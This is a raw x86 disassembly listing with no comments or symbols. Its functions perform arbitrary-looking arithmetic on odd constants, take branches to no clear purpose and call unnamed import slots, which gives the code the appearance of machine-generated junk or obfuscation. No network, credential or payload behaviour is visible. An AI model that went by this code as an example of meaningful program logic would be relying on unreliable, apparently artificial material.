  402126:	add    eax,0x1
  402129:	mov    ecx,DWORD PTR [ebp-0xc]
  40212c:	add    ecx,eax
  40212e:	mov    DWORD PTR [ebp-0xc],ecx
  402131:	movzx  ecx,WORD PTR [ebp-0x20]
  402135:	sub    ecx,0xb2990000
  40213b:	mov    BYTE PTR [ebp-0x1c],cl
  40213e:	movzx  eax,BYTE PTR [ebp-0x18]
  402142:	movzx  ecx,WORD PTR [ebp-0x20]
  402146:	xor    eax,ecx
  402148:	sub    eax,0xffffffff
  40214b:	add    ebx,eax
  40214d:	movzx  eax,WORD PTR [ebp-0x20]
  402151:	movzx  edx,BYTE PTR [ebp-0x1c]
  402155:	or     eax,edx
  402157:	movzx  ecx,BYTE PTR [ebp-0x1c]
  40215b:	sub    eax,ecx
  40215d:	mov    BYTE PTR [ebp-0x18],al
  402160:	mov    dx,WORD PTR [ebp-0x20]
  402164:	test   dx,dx
  402167:	je     0x402174
  402169:	movzx  eax,BYTE PTR [ebp-0x14]
  40216d:	push   eax
  40216e:	call   DWORD PTR ds:0x422030
  402174:	mov    al,BYTE PTR [ebp-0x1c]
  402177:	test   al,al
  402179:	je     0x402184
  40217b:	movzx  eax,BYTE PTR [ebp-0x1c]
  40217f:	jmp    0x40220b
  402184:	movzx  eax,BYTE PTR [ebp-0x14]
  402188:	movzx  edx,BYTE PTR [ebp-0x1c]
  40218c:	and    eax,edx
  40218e:	add    eax,0x1
  402191:	mov    ecx,DWORD PTR [ebp-0x10]
  402194:	sub    ecx,eax
  402196:	mov    DWORD PTR [ebp-0x10],ecx
  402199:	movzx  ecx,BYTE PTR [ebp-0x18]
  40219d:	or     ecx,0x2eb5
  4021a3:	movzx  eax,WORD PTR [ebp-0x20]
  4021a7:	imul   eax,ecx
  4021aa:	mov    WORD PTR [ebp-0x24],ax
  4021ae:	cmp    BYTE PTR [ebp-0x14],0x0
  4021b2:	jge    0x4021bc
  4021b4:	movzx  edx,BYTE PTR [ebp-0x14]
  4021b8:	mov    eax,edx
  4021ba:	jmp    0x40220b
  4021bc:	jmp    0x4020be
  4021c1:	mov    edx,edi
  4021c3:	imul   edx,edx,0xff
  4021c9:	movzx  ecx,WORD PTR [ebp-0x4]
  4021cd:	add    edx,ecx
  4021cf:	movzx  edi,dx
  4021d2:	cmp    WORD PTR [ebp-0x4],0x0
  4021d7:	jle    0x4021df
  4021d9:	movzx  eax,WORD PTR [ebp-0x4]
  4021dd:	jmp    0x40220b
  4021df:	mov    edx,esi
  4021e1:	or     edx,edi
  4021e3:	sub    edx,0xa1ca39fb
  4021e9:	mov    eax,0x5e7648e2
  4021ee:	xor    eax,edx
  4021f0:	mov    DWORD PTR [ebp-0x8],eax
  4021f3:	mov    ecx,esi
  4021f5:	movzx  edi,cx
  4021f8:	mov    ecx,DWORD PTR [ebp-0x8]
  4021fb:	mov    eax,DWORD PTR [ebp-0xc]
  4021fe:	mov    DWORD PTR [ecx],eax
  402200:	movzx  edx,WORD PTR [ebp-0x4]
  402204:	movzx  esi,dl
  402207:	mov    ecx,esi
  402209:	mov    eax,ecx
  40220b:	pop    ebx
  40220c:	pop    edi
  40220d:	pop    esi
  40220e:	mov    esp,ebp
  402210:	pop    ebp
  402211:	ret    
  402212:	push   ebp
  402213:	mov    ebp,esp
  402215:	sub    esp,0x4
  402218:	push   esi
  402219:	push   edi
  40221a:	push   ebx
  40221b:	mov    esi,0xbc00
  402220:	mov    eax,esi
  402222:	movzx  edi,al
  402225:	mov    eax,esi
  402227:	imul   eax,eax,0x4f
  40222a:	movzx  ebx,al
  40222d:	mov    edx,edi
  40222f:	shl    edx,0x10
  402232:	mov    DWORD PTR [ebp-0x4],edx
  402235:	mov    ecx,ebx
  402237:	test   cl,cl
  402239:	je     0x402241
  40223b:	mov    ecx,ebx
  40223d:	mov    eax,ecx
  40223f:	jmp    0x4022aa
  402241:	mov    eax,ebx
  402243:	test   al,al
  402245:	jne    0x402253
  402247:	push   edi
  402248:	push   DWORD PTR [ebp-0x4]
  40224b:	call   0x4022b1
  402250:	movzx  esi,ax
  402253:	mov    ecx,edi
  402255:	shr    ecx,0x2
  402258:	movzx  edi,cl
  40225b:	mov    edx,edi
  40225d:	xor    edx,edx
  40225f:	mov    eax,edi
  402261:	sub    eax,edx
  402263:	movzx  esi,ax
  402266:	cmp    esi,0xffff
  40226c:	jne    0x402274
  40226e:	mov    edx,esi
  402270:	mov    eax,edx
  402272:	jmp    0x4022aa
  402274:	mov    ecx,esi
  402276:	movzx  esi,cx
  402279:	cmp    ebx,0x0
  40227c:	jle    0x402284
  40227e:	call   DWORD PTR ds:0x422000
  402284:	cmp    edi,0xff
  40228a:	jne    0x402292
  40228c:	mov    edx,edi
  40228e:	mov    eax,edx
  402290:	jmp    0x4022aa
  402292:	mov    eax,edi
  402294:	shl    eax,0x8
  402297:	mov    DWORD PTR [ebp-0x4],eax
  40229a:	cmp    esi,0x0
  40229d:	jge    0x4022a6
  40229f:	mov    edx,DWORD PTR [ebp-0x4]
  4022a2:	mov    eax,edx
  4022a4:	jmp    0x4022aa
  4022a6:	mov    ecx,esi
  4022a8:	mov    eax,ecx
  4022aa:	pop    ebx
  4022ab:	pop    edi
  4022ac:	pop    esi
  4022ad:	mov    esp,ebp
  4022af:	pop    ebp
  4022b0:	ret    
  4022b1:	push   ebp
  4022b2:	mov    ebp,esp
  4022b4:	sub    esp,0x8
  4022b7:	push   esi
  4022b8:	push   edi
  4022b9:	push   ebx
  4022ba:	mov    edx,DWORD PTR [ebp+0xc]
  4022bd:	movzx  esi,dl
  4022c0:	mov    eax,DWORD PTR [ebp+0xc]
  4022c3:	movzx  edi,ax
  4022c6:	mov    ecx,edi
  4022c8:	and    ecx,ecx
  4022ca:	imul   ecx,ecx,0x8600
  4022d0:	mov    ebx,ecx
  4022d2:	mov    edx,edi
  4022d4:	movzx  edi,dx
  4022d7:	cmp    esi,0x0
  4022da:	jle    0x4022e5
  4022dc:	mov    ecx,edi
  4022de:	mov    eax,ecx
  4022e0:	jmp    0x4023d6
  4022e5:	mov    eax,esi
  4022e7:	mov    ecx,0x3f
  4022ec:	xor    edx,edx
  4022ee:	div    ecx
  4022f0:	movzx  edi,ax
  4022f3:	mov    ecx,ebx
  4022f5:	shr    ecx,0x2
  4022f8:	mov    BYTE PTR [ebp-0x4],cl
  4022fb:	cmp    BYTE PTR [ebp-0x4],0x0
  4022ff:	jge    0x40231c
  402301:	push   esi
  402302:	mov    ecx,ebx
  402304:	and    ecx,esi
  402306:	mov    eax,edi
  402308:	add    eax,ecx
  40230a:	push   eax
  40230b:	mov    eax,esi
  40230d:	or     eax,edi
  40230f:	movzx  edx,BYTE PTR [ebp-0x4]
  402313:	or     eax,edx
  402315:	push   eax
  402316:	call   DWORD PTR ds:0x422038
  40231c:	movzx  ecx,BYTE PTR [ebp-0x4]
  402320:	imul   ecx,ecx,0xef
  402326:	sub    ecx,DWORD PTR [ebp+0xc]
  402329:	movzx  edi,cx
  40232c:	cmp    esi,0x0
  40232f:	jle    0x402338
  402331:	mov    eax,ebx
  402333:	jmp    0x4023d6
  402338:	mov    edx,ebx
  40233a:	or     edx,0x675c
  402340:	sub    edx,DWORD PTR [ebp+0xc]
  402343:	mov    WORD PTR [ebp-0x8],dx
  402347:	mov    ecx,esi
  402349:	shr    ecx,0x3
  40234c:	movzx  esi,cl
  40234f:	cmp    BYTE PTR [ebp-0x4],0xff
  402353:	jne    0x40235b
  402355:	movzx  eax,BYTE PTR [ebp-0x4]
  402359:	jmp    0x4023d6
  40235b:	movzx  ecx,BYTE PTR [ebp-0x4]
  40235f:	shr    ecx,0x3
  402362:	movzx  edi,cx
  402365:	mov    edx,edi
  402367:	test   dx,dx
  40236a:	je     0x402372
  40236c:	mov    edx,esi
  40236e:	mov    eax,edx
  402370:	jmp    0x4023d6
  402372:	mov    ecx,esi
  402374:	shl    ecx,0x8
  402377:	mov    ebx,ecx
  402379:	mov    edx,edi
  40237b:	test   dx,dx
  40237e:	jne    0x402388
  402380:	push   ebx
  402381:	call   0x4023df
  402386:	mov    ebx,eax
  402388:	mov    edx,DWORD PTR [ebp+0xc]
  40238b:	mov    WORD PTR [ebp-0x8],dx
  40238f:	cmp    esi,0x0
  402392:	jge    0x40239a
  402394:	movzx  eax,WORD PTR [ebp-0x8]
  402398:	jmp    0x4023d6
  40239a:	movzx  ecx,BYTE PTR [ebp-0x4]
  40239e:	imul   ecx,ecx,0xb79e0000
  4023a4:	mov    edx,DWORD PTR [ebp+0x8]
  4023a7:	sub    edx,ecx
  4023a9:	movzx  edi,dx
  4023ac:	cmp    edi,0x0
  4023af:	jle    0x4023b5
  4023b1:	mov    eax,ebx
  4023b3:	jmp    0x4023d6
  4023b5:	mov    edx,ebx
  4023b7:	sub    edx,0x1
  4023ba:	mov    ebx,edx
  4023bc:	mov    ecx,edi
  4023be:	movzx  edi,cx
  4023c1:	mov    eax,edi
  4023c3:	test   ax,ax
  4023c6:	je     0x4023d0
  4023c8:	movzx  ecx,BYTE PTR [ebp-0x4]
  4023cc:	mov    eax,ecx
  4023ce:	jmp    0x4023d6
  4023d0:	movzx  ecx,WORD PTR [ebp-0x8]
  4023d4:	mov    eax,ecx
  4023d6:	pop    ebx
  4023d7:	pop    edi
  4023d8:	pop    esi
  4023d9:	mov    esp,ebp
  4023db:	pop    ebp
  4023dc:	ret    0x8
  4023df:	push   ebp
  4023e0:	mov    ebp,esp
  4023e2:	sub    esp,0x8
  4023e5:	push   esi
  4023e6:	push   edi
  4023e7:	push   ebx
  4023e8:	mov    ecx,DWORD PTR [ebp+0x8]
  4023eb:	movzx  esi,cx
  4023ee:	mov    eax,esi
  4023f0:	shr    eax,0x2
  4023f3:	mov    edi,eax
  4023f5:	mov    edx,edi
  4023f7:	shr    edx,1
  4023f9:	mov    ebx,edx
  4023fb:	mov    edx,edi
  4023fd:	add    edx,0x1
  402400:	mov    edi,edx
  402402:	mov    edx,edi
  402404:	or     edx,DWORD PTR [ebp+0x8]
  402407:	mov    WORD PTR [ebp-0x4],dx
  40240b:	cmp    ebx,0x0
  40240e:	jge    0x402417
  402410:	mov    eax,ebx
  402412:	jmp    0x4024b3
  402417:	mov    ecx,edi
  402419:	sub    ecx,0xace0
  40241f:	mov    DWORD PTR [ebp-0x8],ecx
  402422:	movzx  eax,WORD PTR [ebp-0x4]
  402426:	sub    eax,0x1
  402429:	mov    WORD PTR [ebp-0x4],ax
  40242d:	cmp    edi,0x1
  402430:	je     0x402437
  402432:	mov    eax,DWORD PTR [ebp-0x8]
  402435:	jmp    0x4024b3
  402437:	mov    ecx,ebx
  402439:	shr    ecx,1
  40243b:	mov    WORD PTR [ebp-0x4],cx
  40243f:	cmp    ebx,0x0
  402442:	jle    0x40244a
  402444:	mov    ecx,esi
  402446:	mov    eax,ecx
  402448:	jmp    0x4024b3
  40244a:	mov    edx,esi
  40244c:	test   dx,dx
  40244f:	jne    0x402459
  402451:	push   ebx
  402452:	call   0x403725
  402457:	mov    edi,eax
  402459:	movzx  eax,WORD PTR [ebp-0x4]
  40245d:	xor    edx,edx
  40245f:	div    DWORD PTR [ebp-0x8]
  402462:	mov    DWORD PTR [ebp-0x8],eax
  402465:	mov    ecx,esi
  402467:	test   cx,cx
  40246a:	je     0x402470
  40246c:	mov    eax,edi
  40246e:	jmp    0x4024b3
  402470:	mov    eax,ebx
  402472:	mov    WORD PTR [ebp-0x4],ax
  402476:	mov    ecx,DWORD PTR [ebp-0x8]
  402479:	test   ecx,ecx
  40247b:	je     0x4024a3
  40247d:	push   esi
  40247e:	mov    edx,DWORD PTR [ebp-0x8]
  402481:	or     edx,edx
  402483:	mov    eax,ebx
  402485:	sub    eax,edx
  402487:	push   eax
  402488:	mov    ecx,ebx
  40248a:	and    ecx,0x7c754991
  402490:	push   ecx
  402491:	movzx  ecx,WORD PTR [ebp-0x4]
  402495:	sub    ecx,0x71000000
  40249b:	push   ecx
  40249c:	push   edi
  40249d:	call   DWORD PTR ds:0x42205c
  4024a3:	cmp    esi,0xffff
  4024a9:	jne    0x4024af
  4024ab:	mov    eax,ebx
  4024ad:	jmp    0x4024b3
  4024af:	mov    ebx,ebx
  4024b1:	mov    eax,edi
  4024b3:	pop    ebx
  4024b4:	pop    edi
  4024b5:	pop    esi
  4024b6:	mov    esp,ebp
  4024b8:	pop    ebp
  4024b9:	ret    0x4
  4024bc:	push   ebp
  4024bd:	mov    ebp,esp
  4024bf:	sub    esp,0x4
  4024c2:	push   esi
  4024c3:	push   edi
  4024c4:	push   ebx
  4024c5:	mov    eax,DWORD PTR [ebp+0x10]
  4024c8:	movzx  esi,al
  4024cb:	mov    ecx,esi
  4024cd:	shl    ecx,0x10
  4024d0:	movzx  edi,cl
  4024d3:	cmp    edi,0xff
  4024d9:	jne    0x4024e1
  4024db:	mov    ecx,edi
  4024dd:	mov    eax,ecx
  4024df:	jmp    0x40253a
  4024e1:	mov    eax,esi
  4024e3:	imul   eax,edi
  4024e6:	movzx  esi,al
  4024e9:	mov    eax,edi
  4024eb:	xor    eax,0xfe00
  4024f0:	mov    edx,edi
  4024f2:	sub    edx,eax
  4024f4:	movzx  ebx,dl
  4024f7:	cmp    edi,0x0
  4024fa:	jge    0x402502
  4024fc:	mov    ecx,ebx
  4024fe:	mov    eax,ecx
  402500:	jmp    0x40253a
  402502:	mov    eax,edi
  402504:	test   al,al
  402506:	jne    0x402512
  402508:	push   esi
  402509:	push   edi
  40250a:	call   0x402694
  40250f:	movzx  esi,al
  402512:	mov    ecx,DWORD PTR [ebp+0x8]
  402515:	movzx  ebx,cl
  402518:	mov    eax,DWORD PTR [ebp+0x14]
  40251b:	movzx  esi,al
  40251e:	mov    edx,edi
  402520:	shr    edx,0x3
  402523:	mov    WORD PTR [ebp-0x4],dx
  402527:	mov    edx,DWORD PTR [ebp+0x10]
  40252a:	movzx  esi,dl
  40252d:	cmp    esi,0x7f
  402530:	jle    0x402538
  402532:	movzx  eax,WORD PTR [ebp-0x4]
  402536:	jmp    0x40253a
  402538:	mov    eax,edi
  40253a:	pop    ebx
  40253b:	pop    edi
  40253c:	pop    esi
  40253d:	mov    esp,ebp
  40253f:	pop    ebp
  402540:	ret    0x10
  402543:	push   ebp
  402544:	mov    ebp,esp
  402546:	sub    esp,0x8
  402549:	push   esi
  40254a:	push   edi
  40254b:	push   ebx
  40254c:	mov    eax,DWORD PTR [ebp+0xc]
  40254f:	movzx  esi,ax
  402552:	mov    edx,esi
  402554:	movzx  edi,dl
  402557:	mov    ecx,esi
  402559:	imul   ecx,DWORD PTR [ebp+0x10]
  40255d:	movzx  ebx,cl
  402560:	mov    ecx,ebx
  402562:	or     ecx,0x6aa77523
  402568:	movzx  ebx,cl
  40256b:	cmp    edi,0xff
  402571:	jne    0x40257a
  402573:	push   ebx
  402574:	call   DWORD PTR ds:0x422044
  40257a:	mov    eax,ebx
  40257c:	mov    ecx,0xb
  402581:	xor    edx,edx
  402583:	div    ecx
  402585:	movzx  edi,al
  402588:	cmp    esi,0xffff
  40258e:	jne    0x402597
  402590:	push   ebx
  402591:	call   DWORD PTR ds:0x42207c
  402597:	cmp    ebx,0x23
  40259a:	jne    0x4025a5
  40259c:	push   edi
  40259d:	call   0x4025e9
  4025a2:	movzx  esi,ax
  4025a5:	mov    eax,DWORD PTR [ebp+0x8]
  4025a8:	mov    WORD PTR [ebp-0x4],ax
  4025ac:	cmp    WORD PTR [ebp-0x4],0xf3
  4025b2:	jge    0x4025ba
  4025b4:	mov    edx,esi
  4025b6:	mov    eax,edx
  4025b8:	jmp    0x4025e0
  4025ba:	movzx  ecx,WORD PTR [ebp-0x4]
  4025be:	shr    ecx,0x3
  4025c1:	mov    BYTE PTR [ebp-0x8],cl
  4025c4:	cmp    esi,0x2
  4025c7:	je     0x4025cf
  4025c9:	mov    edx,edi
  4025cb:	mov    eax,edx
  4025cd:	jmp    0x4025e0
  4025cf:	mov    eax,DWORD PTR [ebp+0x10]
  4025d2:	xor    eax,0x6000000
  4025d7:	mov    ecx,edi
  4025d9:	sub    ecx,eax
  4025db:	movzx  esi,cx
  4025de:	mov    eax,esi
  4025e0:	pop    ebx
  4025e1:	pop    edi
  4025e2:	pop    esi
  4025e3:	mov    esp,ebp
  4025e5:	pop    ebp
  4025e6:	ret    0xc
  4025e9:	push   ebp
  4025ea:	mov    ebp,esp
  4025ec:	sub    esp,0x14
  4025ef:	push   esi
  4025f0:	push   edi
  4025f1:	push   ebx
  4025f2:	mov    esi,DWORD PTR [ebp+0x8]
  4025f5:	mov    ecx,esi
  4025f7:	add    ecx,0x1
  4025fa:	mov    esi,ecx
  4025fc:	mov    edx,esi
  4025fe:	shr    edx,1
  402600:	movzx  edi,dx
  402603:	cmp    edi,0x1
  402606:	jne    0x40260c
  402608:	mov    eax,esi
  40260a:	jmp    0x40268b
  40260c:	mov    edx,esi
  40260e:	shr    edx,1
  402610:	mov    ebx,edx
  402612:	mov    edx,esi
  402614:	and    edx,edx
  402616:	sub    edx,0xed000000
  40261c:	mov    WORD PTR [ebp-0x4],dx
  402620:	cmp    esi,0x3
  402623:	jne    0x402638
  402625:	movzx  ecx,WORD PTR [ebp-0x4]
  402629:	and    ecx,0xf6136b6e
  40262f:	add    ecx,esi
  402631:	push   ecx
  402632:	call   DWORD PTR ds:0x422020
  402638:	cmp    esi,0x4
  40263b:	je     0x402643
  40263d:	movzx  eax,WORD PTR [ebp-0x4]
  402641:	jmp    0x40268b
  402643:	mov    DWORD PTR [ebp-0x8],ebx
  402646:	mov    esi,DWORD PTR [ebp+0x8]
  402649:	cmp    DWORD PTR [ebp-0x8],0x2
  40264d:	jne    0x40265c
  40264f:	push   ebx
  402650:	push   esi
  402651:	push   ebx
  402652:	push   DWORD PTR [ebp-0x8]
  402655:	call   0x402d21
  40265a:	mov    ebx,eax
  40265c:	mov    eax,esi
  40265e:	xor    edx,edx
  402660:	div    DWORD PTR [ebp-0x8]
  402663:	mov    esi,eax
  402665:	mov    eax,DWORD PTR [ebp+0x8]
  402668:	mov    DWORD PTR [ebp-0xc],eax
  40266b:	cmp    edi,0x1
  40266e:	jne    0x402674
  402670:	mov    eax,esi
  402672:	jmp    0x40268b
  402674:	mov    ebx,ebx
  402676:	movzx  eax,WORD PTR [ebp-0x4]
  40267a:	shl    eax,0x10
  40267d:	mov    DWORD PTR [ebp-0x10],eax
  402680:	mov    edx,DWORD PTR [ebp+0x8]
  402683:	mov    DWORD PTR [ebp-0x14],edx
  402686:	mov    edx,DWORD PTR [ebp-0x8]
  402689:	mov    eax,edx
  40268b:	pop    ebx
  40268c:	pop    edi
  40268d:	pop    esi
  40268e:	mov    esp,ebp
  402690:	pop    ebp
  402691:	ret    0x4
  402694:	push   ebp
  402695:	mov    ebp,esp
  402697:	sub    esp,0x4
  40269a:	push   esi
  40269b:	push   edi
  40269c:	push   ebx
  40269d:	mov    esi,DWORD PTR [ebp+0x8]
  4026a0:	mov    edx,esi
  4026a2:	shr    edx,0x3
  4026a5:	movzx  edi,dl
  4026a8:	cmp    esi,0xffffffff
  4026ab:	jne    0x4026b4
  4026ad:	mov    eax,esi
  4026af:	jmp    0x402742
  4026b4:	mov    eax,esi
  4026b6:	mov    ecx,0x14
  4026bb:	xor    edx,edx
  4026bd:	div    ecx
  4026bf:	movzx  edi,dl
  4026c2:	mov    edx,DWORD PTR [ebp+0xc]
  4026c5:	xor    edx,edi
  4026c7:	mov    ecx,esi
  4026c9:	imul   ecx,edx
  4026cc:	movzx  ebx,cl
  4026cf:	cmp    ebx,0xff
  4026d5:	jne    0x4026db
  4026d7:	mov    eax,esi
  4026d9:	jmp    0x402742
  4026db:	mov    edx,ebx
  4026dd:	shl    edx,0x8
  4026e0:	mov    WORD PTR [ebp-0x4],dx
  4026e4:	mov    eax,edi
  4026e6:	test   al,al
  4026e8:	jne    0x4026f9
  4026ea:	movzx  ecx,WORD PTR [ebp-0x4]
  4026ee:	push   ecx
  4026ef:	push   edi
  4026f0:	push   esi
  4026f1:	call   0x40274b
  4026f6:	movzx  edi,al
  4026f9:	movzx  edx,WORD PTR [ebp-0x4]
  4026fd:	xor    edx,edx
  4026ff:	add    edx,ebx
  402701:	mov    esi,edx
  402703:	imul   esi,DWORD PTR [ebp+0x8]
  402707:	cmp    WORD PTR [ebp-0x4],0x0
  40270c:	jle    0x402712
  40270e:	mov    eax,ebx
  402710:	jmp    0x402742
  402712:	mov    eax,ebx
  402714:	mov    ecx,0x2
  402719:	xor    edx,edx
  40271b:	div    ecx
  40271d:	movzx  ebx,al
  402720:	movzx  ecx,WORD PTR [ebp-0x4]
  402724:	mov    esi,ecx
  402726:	mov    edx,esi
  402728:	shr    edx,0x3
  40272b:	mov    WORD PTR [ebp-0x4],dx
  40272f:	mov    ax,WORD PTR [ebp-0x4]
  402733:	test   ax,ax
  402736:	je     0x40273c
  402738:	mov    eax,esi
  40273a:	jmp    0x402742
  40273c:	movzx  edx,WORD PTR [ebp-0x4]
  402740:	mov    eax,edx
  402742:	pop    ebx
  402743:	pop    edi
  402744:	pop    esi
  402745:	mov    esp,ebp
  402747:	pop    ebp
  402748:	ret    0x8
  40274b:	push   ebp
  40274c:	mov    ebp,esp
  40274e:	sub    esp,0x8
  402751:	push   esi
  402752:	push   edi
  402753:	push   ebx
  402754:	mov    esi,0x0
  402759:	mov    edx,esi
  40275b:	shl    edx,0x8
  40275e:	movzx  edi,dx
  402761:	mov    eax,edi
  402763:	test   ax,ax
  402766:	je     0x40276f
  402768:	push   edi
  402769:	call   DWORD PTR ds:0x422040
  40276f:	mov    eax,edi
  402771:	shr    eax,1
  402773:	movzx  ebx,al
  402776:	mov    edx,esi
  402778:	test   dl,dl
  40277a:	je     0x402782
  40277c:	mov    edx,ebx
  40277e:	mov    eax,edx
  402780:	jmp    0x4027e2
  402782:	mov    edx,edi
  402784:	and    edx,0x3c00
  40278a:	or     edx,ebx
  40278c:	mov    BYTE PTR [ebp-0x4],dl
  40278f:	mov    eax,ebx
  402791:	test   al,al
  402793:	jne    0x4027a0
  402795:	push   edi
  402796:	push   edi
  402797:	push   edi
  402798:	call   0x40126a
  40279d:	movzx  ebx,al
  4027a0:	movzx  edx,BYTE PTR [ebp-0x4]
  4027a4:	imul   edx,edx,0x7285504
  4027aa:	movzx  ebx,dl
  4027ad:	mov    ecx,esi
  4027af:	shr    ecx,1
  4027b1:	mov    DWORD PTR [ebp-0x8],ecx
  4027b4:	mov    eax,esi
  4027b6:	or     eax,DWORD PTR [ebp-0x8]
  4027b9:	movzx  ebx,al
  4027bc:	cmp    BYTE PTR [ebp-0x4],0x0
  4027c0:	jle    0x4027c7
  4027c2:	mov    eax,DWORD PTR [ebp-0x8]
  4027c5:	jmp    0x4027e2
  4027c7:	mov    eax,edi
  4027c9:	imul   eax,eax,0xafbf45d2
  4027cf:	movzx  esi,al
  4027d2:	cmp    BYTE PTR [ebp-0x4],0xff
  4027d6:	jne    0x4027de
  4027d8:	movzx  eax,BYTE PTR [ebp-0x4]
  4027dc:	jmp    0x4027e2
  4027de:	mov    ecx,edi
  4027e0:	mov    eax,ecx
  4027e2:	pop    ebx
  4027e3:	pop    edi
  4027e4:	pop    esi
  4027e5:	mov    esp,ebp
  4027e7:	pop    ebp
  4027e8:	ret    0xc
  4027eb:	push   ebp
  4027ec:	mov    ebp,esp
  4027ee:	sub    esp,0x4
  4027f1:	push   esi
  4027f2:	push   edi
  4027f3:	push   ebx
  4027f4:	mov    ecx,DWORD PTR [ebp+0xc]
  4027f7:	movzx  esi,cx
  4027fa:	mov    edx,esi
  4027fc:	sub    edx,0x1
  4027ff:	movzx  esi,dx
  402802:	cmp    esi,0x5a
  402805:	jne    0x402827
  402807:	mov    ecx,esi
  402809:	sub    ecx,ecx
  40280b:	push   ecx
  40280c:	mov    ecx,esi
  40280e:	or     ecx,ecx
  402810:	push   ecx
  402811:	mov    eax,esi
  402813:	add    eax,eax
  402815:	sub    eax,esi
  402817:	push   eax
  402818:	mov    eax,esi
  40281a:	xor    eax,0x90200
  40281f:	push   eax
  402820:	push   esi
  402821:	call   DWORD PTR ds:0x422008
  402827:	mov    eax,esi
  402829:	and    eax,0x47000000
  40282e:	movzx  edi,ax
  402831:	cmp    edi,0x0
  402834:	jge    0x40283f
  402836:	mov    edx,edi
  402838:	mov    eax,edx
  40283a:	jmp    0x402913
  40283f:	mov    ebx,DWORD PTR [ebp+0xc]
  402842:	mov    eax,edi
  402844:	movzx  esi,ax
  402847:	cmp    ebx,0x5c
  40284a:	jle    0x402853
  40284c:	mov    eax,esi
  40284e:	jmp    0x402913
  402853:	mov    eax,edi
  402855:	shr    eax,0x2
  402858:	mov    WORD PTR [ebp-0x4],ax
  40285c:	cmp    edi,0xffff
  402862:	jne    0x40286d
  402864:	movzx  eax,WORD PTR [ebp-0x4]
  402868:	jmp    0x402913
  40286d:	movzx  eax,WORD PTR [ebp-0x4]
  402871:	xor    eax,0x467a9bdb
  402876:	xor    eax,esi
  402878:	movzx  edi,ax
  40287b:	mov    ecx,DWORD PTR [ebp+0x8]
  40287e:	or     ecx,0xcf000000
  402884:	mov    WORD PTR [ebp-0x4],cx
  402888:	mov    eax,ebx
  40288a:	xor    eax,0x2e00
  40288f:	movzx  edi,ax
  402892:	cmp    ebx,0x5c
  402895:	jge    0x40289b
  402897:	mov    eax,ebx
  402899:	jmp    0x402913
  40289b:	mov    eax,edi
  40289d:	sub    eax,0x17da0000
  4028a2:	movzx  esi,ax
  4028a5:	cmp    ebx,0x5c
  4028a8:	jne    0x4028b8
  4028aa:	push   edi
  4028ab:	push   esi
  4028ac:	movzx  edx,WORD PTR [ebp-0x4]
  4028b0:	push   edx
  4028b1:	call   0x402b97
  4028b6:	mov    ebx,eax
  4028b8:	mov    ecx,esi
  4028ba:	add    ecx,0x1
  4028bd:	movzx  esi,cx
  4028c0:	cmp    edi,0x2e5c
  4028c6:	je     0x4028cc
  4028c8:	mov    eax,ebx
  4028ca:	jmp    0x402913
  4028cc:	mov    eax,DWORD PTR [ebp+0xc]
  4028cf:	movzx  edx,WORD PTR [ebp-0x4]
  4028d3:	and    eax,edx
  4028d5:	imul   eax,eax,0x367
  4028db:	mov    ebx,eax
  4028dd:	cmp    WORD PTR [ebp-0x4],0x5bff
  4028e3:	jne    0x4028ed
  4028e5:	movzx  edx,WORD PTR [ebp-0x4]
  4028e9:	mov    eax,edx
  4028eb:	jmp    0x402913
  4028ed:	mov    ecx,ebx
  4028ef:	shr    ecx,1
  4028f1:	movzx  esi,cx
  4028f4:	cmp    esi,0x0
  4028f7:	jge    0x4028fd
  4028f9:	mov    eax,edi
  4028fb:	jmp    0x402913
  4028fd:	mov    eax,ebx
  4028ff:	shr    eax,1
  402901:	movzx  edi,ax
  402904:	cmp    edi,0x0
  402907:	jle    0x40290f
  402909:	mov    ecx,esi
  40290b:	mov    eax,ecx
  40290d:	jmp    0x402913
  40290f:	mov    edx,edi
  402911:	mov    eax,edx
  402913:	pop    ebx
  402914:	pop    edi
  402915:	pop    esi
  402916:	mov    esp,ebp
  402918:	pop    ebp
  402919:	ret    0x8
  40291c:	push   ebp
  40291d:	mov    ebp,esp
  40291f:	sub    esp,0x38
  402922:	push   esi
  402923:	push   edi
  402924:	push   ebx
  402925:	mov    esi,0xdf
  40292a:	mov    edx,esi
  40292c:	sub    edx,0x6b00
  402932:	movzx  edi,dx
  402935:	mov    eax,edi
  402937:	xor    eax,eax
  402939:	mov    esi,eax
  40293b:	cmp    esi,0x0
  40293e:	jge    0x402947
  402940:	mov    eax,edi
  402942:	jmp    0x402b8e
  402947:	mov    eax,esi
  402949:	xor    eax,0x3061
  40294e:	movzx  edi,ax
  402951:	test   esi,esi
  402953:	je     0x40295c
  402955:	mov    eax,esi
  402957:	jmp    0x402b8e
  40295c:	mov    edx,esi
  40295e:	add    edx,edi
  402960:	add    edx,0x8f778a6a
  402966:	mov    ecx,0x8f3785d5
  40296b:	xor    ecx,edx
  40296d:	mov    ebx,ecx
  40296f:	mov    ecx,esi
  402971:	sub    ecx,0xee
  402977:	mov    WORD PTR [ebp-0x4],cx
  40297b:	mov    ecx,edi
  40297d:	movzx  edx,WORD PTR [ebp-0x4]
  402981:	imul   ecx,edx
  402984:	add    ecx,0xb81b0495
  40298a:	mov    eax,0xe80c9a6b
  40298f:	xor    eax,ecx
  402991:	mov    DWORD PTR [ebp-0x8],eax
  402994:	movzx  eax,WORD PTR [ebp-0x4]
  402998:	shr    eax,0x2
  40299b:	mov    BYTE PTR [ebp-0xc],al
  40299e:	cmp    edi,0x3061
  4029a4:	jle    0x4029af
  4029a6:	movzx  eax,BYTE PTR [ebp-0xc]
  4029aa:	jmp    0x402b8e
  4029af:	mov    edx,DWORD PTR [ebp-0x8]
  4029b2:	mov    eax,DWORD PTR [edx]
  4029b4:	mov    DWORD PTR [ebp-0x10],eax
  4029b7:	mov    eax,esi
  4029b9:	shl    eax,0x10
  4029bc:	mov    WORD PTR [ebp-0x14],ax
  4029c0:	movzx  edx,BYTE PTR [ebp-0xc]
  4029c4:	movzx  ecx,WORD PTR [ebp-0x14]
  4029c8:	imul   edx,ecx
  4029cb:	add    edx,0x1dd2a
  4029d1:	mov    DWORD PTR [ebp-0x18],edx
  4029d4:	mov    eax,esi
  4029d6:	shr    eax,0x3
  4029d9:	mov    DWORD PTR [ebp-0x1c],eax
  4029dc:	cmp    DWORD PTR [ebp-0x1c],0x0
  4029e0:	jge    0x4029ec
  4029e2:	mov    edx,DWORD PTR [ebp-0x1c]
  4029e5:	mov    eax,edx
  4029e7:	jmp    0x402b8e
  4029ec:	mov    ecx,edi
  4029ee:	movzx  edx,WORD PTR [ebp-0x4]
  4029f2:	xor    ecx,edx
  4029f4:	sub    ecx,0xcf73
